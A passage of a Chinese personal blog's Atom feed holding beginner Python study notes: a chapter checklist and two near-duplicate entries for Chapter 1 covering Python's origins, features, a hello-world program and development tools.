    <content type="html"><![CDATA[<h1 id="零基础学Python"><a href="#零基础学Python" class="headerlink" title="零基础学Python"></a>零基础学Python</h1><p>[TOC]</p><hr><h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><h4 id="第一篇-python-语言基础"><a href="#第一篇-python-语言基础" class="headerlink" title="第一篇  python 语言基础"></a>第一篇  python 语言基础</h4><ul><li style="list-style: none"><input type="checkbox" checked> ##### 第1章 进入Python的世界</li></ul><ul><li style="list-style: none"><input type="checkbox"> ##### 第2章 Python必须知道的基础语法</li></ul><ul><li style="list-style: none"><input type="checkbox"> ##### 第3章 Python控制语句</li></ul><ul><li style="list-style: none"><input type="checkbox"> ##### 第4章 Python数据结构</li></ul><ul><li style="list-style: none"><input type="checkbox"> ##### 第5章 模块与函数</li></ul><ul><li style="list-style: none"><input type="checkbox"> ##### 第6章 字符串与正则表达式</li></ul><ul><li style="list-style: none"><input type="checkbox"> ##### 第7章 使用Python处理文件</li></ul><ul><li style="list-style: none"><input type="checkbox"> ##### 第8章 面向对象编程</li></ul><ul><li style="list-style: none"><input type="checkbox"> ##### 第9章 异常处理与程序调试</li></ul><ul><li style="list-style: none"><input type="checkbox"> ##### 第10章  数据库编程</li></ul><p><strong>争取在一个月左右，重新温习Python的语法并学习新的知识点，能将Python的70%掌握，每天进行学习记录。</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;零基础学Python&quot;&gt;&lt;a href=&quot;#零基础学Python&quot; class=&quot;headerlink&quot; title=&quot;零基础学Python&quot;&gt;&lt;/a&gt;零基础学Python&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;hr&gt;
&lt;h4 id=&quot;目录&quot;&gt;&lt;a href=&quot;#目
      
    
    </summary>
    
      <category term="Python" scheme="https://fengchao1847081353.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://fengchao1847081353.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>第1章 进入Python的世界</title>
    <link href="https://fengchao1847081353.github.io/2019/04/20/%E6%B5%8B%E8%AF%95/"/>
    <id>https://fengchao1847081353.github.io/2019/04/20/测试/</id>
    <published>2019-04-20T14:45:43.000Z</published>
    <updated>2019-05-25T12:15:56.658Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第1章-进入Python的世界"><a href="#第1章-进入Python的世界" class="headerlink" title="第1章 进入Python的世界"></a>第1章 进入Python的世界</h1><p>Python是一种动态解释型语言的编程语言</p><h4 id="1-1-Python的由来"><a href="#1-1-Python的由来" class="headerlink" title="1.1 Python的由来"></a>1.1 Python的由来</h4><p>Python语言是由Guido van Rossum在1989年开发，在1991年正式发表.</p><h4 id="1-2-Python的特色"><a href="#1-2-Python的特色" class="headerlink" title="1.2 Python的特色"></a>1.2 Python的特色</h4><p><strong>1</strong>.<strong>面向对象特性</strong></p><p><strong>2</strong>.<strong>内置的数据结构</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">包括元组、列表、字典、集合等</span><br></pre></td></tr></table></figure><p><strong>3</strong>.<strong>简单性</strong></p><p><strong>4</strong>.<strong>健壮性</strong></p><p><strong>5</strong>.<strong>跨平台性</strong></p><p><strong>6</strong>.<strong>可扩展性</strong></p><p><strong>7.动态性</strong></p><p><strong>8.强语言性</strong></p><p><strong>9.应用广泛</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python语言应用于数据库、网络、数学计算、WEB开发、操作系统扩展领域</span><br></pre></td></tr></table></figure><h4 id="1-3-第一个Python程序"><a href="#1-3-第一个Python程序" class="headerlink" title="1.3 第一个Python程序"></a>1.3 第一个Python程序</h4><p>​    <strong>python的源代码文件以“py”作为后缀，创建一个名为hello.py的文件，输出字符串“hello word”</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">"hello world"</span>)</span><br></pre></td></tr></table></figure><ul><li><h5 id="代码说明"><a href="#代码说明" class="headerlink" title="代码说明"></a>代码说明</h5></li></ul><p><strong>1.第一行代码相当于C语言中的main函数，是python程序的入口</strong></p><p> <strong>main函数解释</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.main函数就是第一个被调用的函数，和定义的位置、前后顺序无关</span><br><span class="line">2.在main函数之前定义一个全局变量，或者定义一个函数，都不影响main首先被执行。</span><br><span class="line">3.main()函数称之为主函数，一个C程序总是从main()函数开始执行的。</span><br></pre></td></tr></table></figure><p><strong>2.第二行代码使用了print语句输出字符串“hello world”</strong></p><p><strong>结果</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello world</span><br></pre></td></tr></table></figure><p><strong>Python的print语句用于输出字符串的内容，即把双引号的内容输出到控制台，Python的输入输出是通过“流”实现的，上述prin语句把字符串的内容输出到标准流，即输出到控制台，流也可以把结果输出到文件。</strong></p><ul><li><strong>python的运行</strong></li></ul><p>​       <strong>python  源文件+python路径</strong></p><p>​       <strong>python_file.py表示Python的源文件，python_file_path表示文件所在的路径</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python python_file_path  +  python_file.py</span><br><span class="line">python C:\user\hello.py</span><br></pre></td></tr></table></figure><h4 id="1-4-1-Python的下载与安装"><a href="#1-4-1-Python的下载与安装" class="headerlink" title="1.4.1  Python的下载与安装"></a>1.4.1  Python的下载与安装</h4><p><strong>官网</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.python.org</span><br></pre></td></tr></table></figure><p><strong>支持系统</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Windows</span><br><span class="line">Linux</span><br><span class="line">Unix</span><br><span class="line">其他系统...</span><br></pre></td></tr></table></figure><h4 id="1-5-Python的开发工具"><a href="#1-5-Python的开发工具" class="headerlink" title="1.5 Python的开发工具"></a>1.5 Python的开发工具</h4><p><strong>例如 Komodo、PythonWin、Eclipse、PyCharm,支持图形化操作具备编辑、调试等功能</strong></p><p><strong>比较好用的工具</strong></p><p><strong>PyCharm</strong></p><p><strong>Eclipse</strong></p><h4 id="1-6-运行"><a href="#1-6-运行" class="headerlink" title="1.6 运行"></a>1.6 运行</h4><p><strong>#！/bin/python</strong></p><p><strong>可以在UNIX平台下运行</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第1章-进入Python的世界&quot;&gt;&lt;a href=&quot;#第1章-进入Python的世界&quot; class=&quot;headerlink&quot; title=&quot;第1章 进入Python的世界&quot;&gt;&lt;/a&gt;第1章 进入Python的世界&lt;/h1&gt;&lt;p&gt;Python是一种动态解释型语言的编
      
    
    </summary>
    
      <category term="Python" scheme="https://fengchao1847081353.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://fengchao1847081353.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>测试</title>
    <link href="https://fengchao1847081353.github.io/2019/04/20/%E7%AC%AC1%E7%AB%A0%20%E8%BF%9B%E5%85%A5Python%E7%9A%84%E4%B8%96%E7%95%8C%20(2)/"/>
    <id>https://fengchao1847081353.github.io/2019/04/20/第1章 进入Python的世界 (2)/</id>
    <published>2019-04-20T14:45:43.000Z</published>
    <updated>2019-05-25T12:16:24.410Z</updated>
    
    <content type="html"><![CDATA[<h1 id="第1章-进入Python的世界"><a href="#第1章-进入Python的世界" class="headerlink" title="第1章 进入Python的世界"></a>第1章 进入Python的世界</h1><p>Python是一种动态解释型语言的编程语言</p><h4 id="1-1-Python的由来"><a href="#1-1-Python的由来" class="headerlink" title="1.1 Python的由来"></a>1.1 Python的由来</h4><p>Python语言是由Guido van Rossum在1989年开发，在1991年正式发表.</p><h4 id="1-2-Python的特色"><a href="#1-2-Python的特色" class="headerlink" title="1.2 Python的特色"></a>1.2 Python的特色</h4><p><strong>1</strong>.<strong>面向对象特性</strong></p><p><strong>2</strong>.<strong>内置的数据结构</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">包括元组、列表、字典、集合等</span><br></pre></td></tr></table></figure><p><strong>3</strong>.<strong>简单性</strong></p><p><strong>4</strong>.<strong>健壮性</strong></p><p><strong>5</strong>.<strong>跨平台性</strong></p><p><strong>6</strong>.<strong>可扩展性</strong></p><p><strong>7.动态性</strong></p><p><strong>8.强语言性</strong></p><p><strong>9.应用广泛</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Python语言应用于数据库、网络、数学计算、WEB开发、操作系统扩展领域</span><br></pre></td></tr></table></figure><h4 id="1-3-第一个Python程序"><a href="#1-3-第一个Python程序" class="headerlink" title="1.3 第一个Python程序"></a>1.3 第一个Python程序</h4><p>​    <strong>python的源代码文件以“py”作为后缀，创建一个名为hello.py的文件，输出字符串“hello word”</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    print(<span class="string">"hello world"</span>)</span><br></pre></td></tr></table></figure><ul><li><h5 id="代码说明"><a href="#代码说明" class="headerlink" title="代码说明"></a>代码说明</h5></li></ul><p><strong>1.第一行代码相当于C语言中的main函数，是python程序的入口</strong></p><p> <strong>main函数解释</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.main函数就是第一个被调用的函数，和定义的位置、前后顺序无关</span><br><span class="line">2.在main函数之前定义一个全局变量，或者定义一个函数，都不影响main首先被执行。</span><br><span class="line">3.main()函数称之为主函数，一个C程序总是从main()函数开始执行的。</span><br></pre></td></tr></table></figure><p><strong>2.第二行代码使用了print语句输出字符串“hello world”</strong></p><p><strong>结果</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hello world</span><br></pre></td></tr></table></figure><p><strong>Python的print语句用于输出字符串的内容，即把双引号的内容输出到控制台，Python的输入输出是通过“流”实现的，上述prin语句把字符串的内容输出到标准流，即输出到控制台，流也可以把结果输出到文件。</strong></p><ul><li><strong>python的运行</strong></li></ul><p>​       <strong>python  源文件+python路径</strong></p><p>​       <strong>python_file.py表示Python的源文件，python_file_path表示文件所在的路径</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python python_file_path  +  python_file.py</span><br><span class="line">python C:\user\hello.py</span><br></pre></td></tr></table></figure><h4 id="1-4-1-Python的下载与安装"><a href="#1-4-1-Python的下载与安装" class="headerlink" title="1.4.1  Python的下载与安装"></a>1.4.1  Python的下载与安装</h4><p><strong>官网</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">www.python.org</span><br></pre></td></tr></table></figure><p><strong>支持系统</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Windows</span><br><span class="line">Linux</span><br><span class="line">Unix</span><br><span class="line">其他系统...</span><br></pre></td></tr></table></figure><h4 id="1-5-Python的开发工具"><a href="#1-5-Python的开发工具" class="headerlink" title="1.5 Python的开发工具"></a>1.5 Python的开发工具</h4><p><strong>例如 Komodo、PythonWin、Eclipse、PyCharm,支持图形化操作具备编辑、调试等功能</strong></p><p><strong>比较好用的工具</strong></p><p><strong>PyCharm</strong></p><p><strong>Eclipse</strong></p><h4 id="1-6-运行"><a href="#1-6-运行" class="headerlink" title="1.6 运行"></a>1.6 运行</h4><p><strong>#！/bin/python</strong></p><p><strong>可以在UNIX平台下运行</strong></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第1章-进入Python的世界&quot;&gt;&lt;a href=&quot;#第1章-进入Python的世界&quot; class=&quot;headerlink&quot; title=&quot;第1章 进入Python的世界&quot;&gt;&lt;/a&gt;第1章 进入Python的世界&lt;/h1&gt;&lt;p&gt;Python是一种动态解释型语言的编
      
    
    </summary>
    
      <category term="Python" scheme="https://fengchao1847081353.github.io/categories/Python/"/>
    
    
      <category term="Python" scheme="https://fengchao1847081353.github.io/tags/Python/"/>
    
  </entry>
  
</feed>
